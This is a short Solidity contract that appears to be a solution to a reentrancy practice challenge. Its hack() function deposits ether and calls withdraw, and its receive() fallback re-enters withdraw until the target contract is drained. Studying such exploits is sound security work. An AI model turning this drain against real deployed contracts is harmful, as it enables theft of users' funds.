// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import '../../src/Reentrancy/Reentrancy.sol';

contract ReentrancyExploit {
    Reentrancy victim;

    constructor(address _victim) public {
        victim = Reentrancy(payable(_victim));
    }

    function hack() public payable {
        // Deposit 1 ether to create an initial balance
        victim.donate{value: 1 ether}(address(this));
        // Start the attack by calling withdraw
        victim.withdraw(1 ether);
    }

    receive() external payable {
        // Reenter withdraw while the victim has balance
        if(address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        } else if(address(victim).balance > 0) {
            victim.withdraw(address(victim).balance);
        }
    }
}